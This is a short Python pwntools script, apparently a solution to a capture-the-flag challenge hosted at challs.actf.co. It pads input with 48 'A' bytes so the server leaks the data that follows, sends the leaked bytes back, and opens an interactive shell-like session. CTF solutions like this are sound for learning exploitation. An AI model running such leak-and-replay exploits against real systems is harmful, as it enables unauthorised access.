from pwn import *

p = remote('challs.actf.co', 31223)

p.send(b'A'*48)
p.recvuntil(b'Nice to meet you, ' + b'A'*48)
name = p.recvuntil(b'!\n', drop=True)

print(name)

p.send(name)

p.interactive()
